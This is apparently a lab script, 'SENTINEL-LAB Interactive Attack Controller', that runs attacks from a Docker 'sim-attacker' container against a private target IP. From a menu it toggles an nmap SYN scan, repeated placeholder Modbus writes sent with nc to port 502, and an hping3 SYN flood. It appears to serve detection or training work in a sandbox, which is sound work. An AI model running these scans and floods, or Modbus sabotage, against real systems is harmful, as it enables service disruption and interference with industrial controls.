#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import threading
import urllib.request
import json

TARGET_IP = "172.30.0.1"

GREEN = "\033[0;32m"
RED = "\033[0;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
NC = "\033[0m"

attacks_active = {
    "port_scan": False,
    "modbus_sabotage": False,
    "syn_flood": False
}

def exec_docker(container, cmd):
    full_cmd = f"sudo docker exec {container} {cmd}"
    return subprocess.run(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def worker_port_scan():
    while attacks_active["port_scan"]:
        exec_docker("sim-attacker", f"nmap -sS -p 22,80,443,502,8443 {TARGET_IP}")
        time.sleep(1)

def worker_modbus_sabotage():
    while attacks_active["modbus_sabotage"]:
        cmd = f"sh -c \"echo 'MALICIOUS_UNAUTHORIZED_MODBUS_WRITE' | nc -w 1 {TARGET_IP} 502\""
        exec_docker("sim-attacker", cmd)
        time.sleep(0.2)

def worker_syn_flood():
    while attacks_active["syn_flood"]:
        exec_docker("sim-attacker", f"hping3 --syn -p 80 --faster -c 1000 {TARGET_IP}")
        time.sleep(0.5)

def toggle_attack(key, func):
    if attacks_active[key]:
        attacks_active[key] = False
        print(f"{YELLOW}[Console] Stopped {key}{NC}")
    else:
        attacks_active[key] = True
        t = threading.Thread(target=func, daemon=True)
        t.start()
        print(f"{RED}[Console] Started {key}!{NC}")

def stop_all():
    for k in attacks_active:
        attacks_active[k] = False
    print(f"\n{GREEN}[Console] All attacks stopped.{NC}")

def print_menu():
    os.system('clear')
    print(f"{CYAN}======================================================{NC}")
    print(f"{CYAN}       SENTINEL-LAB Interactive Attack Controller     {NC}")
    print(f"{CYAN}======================================================{NC}")
    print(" Active Vectors:")
    for name, state in attacks_active.items():
        st = f"{RED}[ACTIVE]{NC}" if state else f"{GREEN}[IDLE]{NC}"
        print(f"   {name:<25}: {st}")
    print(f"{CYAN}------------------------------------------------------{NC}")
    print(" Controls:")
    print("   1. Toggle Nmap Port Scan")
    print("   2. Toggle Modbus SCADA Sabotage")
    print("   3. Toggle TCP SYN Packet Flood")
    print("   4. Stop All Attacks")
    print("   5. Exit")
    print(f"{CYAN}======================================================{NC}")

def main():
    while True:
        print_menu()
        choice = input(f"\n{YELLOW}Select [1-5]: {NC}").strip()
        if choice == '1': toggle_attack("port_scan", worker_port_scan)
        elif choice == '2': toggle_attack("modbus_sabotage", worker_modbus_sabotage)
        elif choice == '3': toggle_attack("syn_flood", worker_syn_flood)
        elif choice == '4': stop_all()
        elif choice == '5': stop_all(); sys.exit(0)
        time.sleep(0.3)

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        stop_all()
        sys.exit(0)